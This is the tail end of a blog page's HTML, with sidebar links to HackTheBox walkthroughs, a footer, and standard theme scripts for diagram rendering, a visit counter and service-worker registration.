Walkthrough</a><time datetime="2023-09-12T18:30:00.000Z" title="Created 2023-09-13 00:00:00">2023-09-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/htb/HackTheBox-Granny-Walkthrough/" title="HackTheBox - Granny Walkthrough">HackTheBox - Granny Walkthrough</a><time datetime="2023-09-11T18:30:00.000Z" title="Created 2023-09-12 00:00:00">2023-09-12</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By mdn1nj4</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
